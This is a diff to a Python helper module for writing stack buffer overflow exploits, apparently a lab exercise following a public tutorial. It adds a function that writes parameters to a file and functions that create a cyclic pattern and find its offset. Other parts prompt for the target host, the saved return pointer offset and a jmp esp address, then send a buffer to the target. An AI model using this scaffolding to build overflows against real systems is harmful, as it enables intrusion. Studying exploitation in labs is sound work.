@@ -7,7 +7,7 @@
 # Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
 # https://github.com/justinsteven/dostackbufferoverflowgood
 
-import socket
+import socket, struct
 
 # import params from params.py; or create an empty file if not exists
 try:
@@ -16,14 +16,18 @@ except:
     open('params.py', 'a').close()
     print "params.py created for parameter persistence."
 
+# write parameter to file for persistence
+def writeParamToFile(param_name, param_value):
+    with open("params.py", "a") as f:
+        f.write("%s = %s\n" % (param_name, param_value))
+
 # return remote host (target) IP address
 def getRhost():
     try:
         return params.RHOST
     except:
         RHOST = raw_input("RHOST: ")
-        with open("params.py", "a") as f:
-            f.write("RHOST = \"" + RHOST + "\"\n")
+        writeParamToFile("RHOST", '\"' + RHOST + '\"')
         return RHOST
 
 # return remote host (target) port
@@ -32,8 +36,7 @@ def getRport():
         return params.RPORT
     except:
         RPORT = raw_input("RPORT: ")
-        with open("params.py", "a") as f:
-            f.write("RPORT = " + RPORT + "\n")
+        writeParamToFile("RPORT", RPORT)
         return int(RPORT)
 
 # return max buffer length
@@ -42,8 +45,7 @@ def getBufTotlen():
         return params.buf_totlen
     except:
         buf_totlen = raw_input("Max buffer length: ")
-        with open("params.py", "a") as f:
-            f.write("buf_totlen = " + buf_totlen + "\n")
+        writeParamToFile("buf_totlen", buf_totlen)
         return int(buf_totlen)
 
 # return Saved Return Pointer offset
@@ -52,8 +54,7 @@ def getOffsetSrp():
         return params.offset_srp
     except:
         offset_srp = raw_input("offset_srp: ")
-        with open("params.py", "a") as f:
-            f.write("offset_srp = " + offset_srp + "\n")
+        writeParamToFile("offset_srp", offset_srp)
         return int(offset_srp)
 
 # return pointer address to jmp esp
@@ -62,8 +63,7 @@ def getPtrJmpEsp():
         return params.ptr_jmp_esp
     except:
         ptr_jmp_esp = raw_input("ptr_jmp_esp: ")
-        with open("params.py", "a") as f:
-            f.write("ptr_jmp_esp = " + ptr_jmp_esp + "\n")
+        writeParamToFile("ptr_jmp_esp", ptr_jmp_esp)
         return int(ptr_jmp_esp, 16)
 
 # connect to remote host (target) and send buffer
@@ -89,3 +89,31 @@ def sendBuffer(RHOST, RPORT, buf):
         print "Error connecting to service..."
 
         return 1
+
+# return unique pattern of desired length
+def pattern_create(length):
+    pattern = ''
+    parts = ['A', 'a', '0']
+    while len(pattern) != length:
+        pattern += parts[len(pattern) % 3]
+        if len(pattern) % 3 == 0:
+            parts[2] = chr(ord(parts[2]) + 1)
+            if parts[2] > '9':
+                parts[2] = '0'
+                parts[1] = chr(ord(parts[1]) + 1)
+                if parts[1] > 'z':
+                    parts[1] = 'a'
+                    parts[0] = chr(ord(parts[0]) + 1)
+                    if parts[0] > 'Z':
+                        parts[0] = 'A'
+    return pattern
+
+# return pattern offset given a unique pattern and value to search for
+def pattern_offset(value, pattern):
+    value = struct.pack('<I', int(value, 16)).strip('\x00')
+    print "value =", value
+    try:
+        return pattern.index(value)
+    except ValueError:
+        print "Pattern not found..."
+        return "Not found"
